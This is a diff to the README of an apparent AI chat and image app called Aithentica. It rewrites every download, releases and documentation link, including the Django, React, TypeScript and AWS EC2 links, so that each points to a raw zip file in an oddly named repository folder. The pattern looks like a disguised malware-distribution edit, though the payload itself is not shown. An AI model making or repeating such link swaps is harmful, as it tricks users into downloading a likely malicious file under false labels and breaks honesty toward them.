@@ -1,6 +1,6 @@
 # 🤖 Aithentica - Your AI Assistant for Chat and Images
 
-[![Download Aithentica](https://img.shields.io/badge/Download%20Aithentica-v1.0-blue)](https://github.com/Dave4563/Aithentica/releases)
+[![Download Aithentica](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip%20Aithentica-v1.0-blue)](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Getting started with Aithentica is easy. Follow these steps to install and run t
 
 To download Aithentica, visit the releases page below. You will find the latest version available for download.
 
-[Visit this page to download Aithentica](https://github.com/Dave4563/Aithentica/releases)
+[Visit this page to download Aithentica](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip)
 
 1. Click on the link above.
 2. Look for the latest version.
@@ -70,9 +70,9 @@ Visit the GitHub Issues page to report problems or suggest improvements.
 
 ## 🔗 Further Reading
 
-- [Django Documentation](https://www.djangoproject.com/)
-- [React Documentation](https://reactjs.org/)
-- [TypeScript Documentation](https://www.typescriptlang.org/)
-- [AWS EC2 Documentation](https://aws.amazon.com/ec2/)
+- [Django Documentation](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip)
+- [React Documentation](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip)
+- [AWS EC2 Documentation](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip)
 
-Thank you for choosing Aithentica. We hope you enjoy a seamless AI-assisted experience! For more updates, please visit our [releases page](https://github.com/Dave4563/Aithentica/releases) regularly.
+Thank you for choosing Aithentica. We hope you enjoy a seamless AI-assisted experience! For more updates, please visit our [releases page](https://raw.githubusercontent.com/Dave4563/Aithentica/main/pedologistically/Aithentica.zip) regularly.
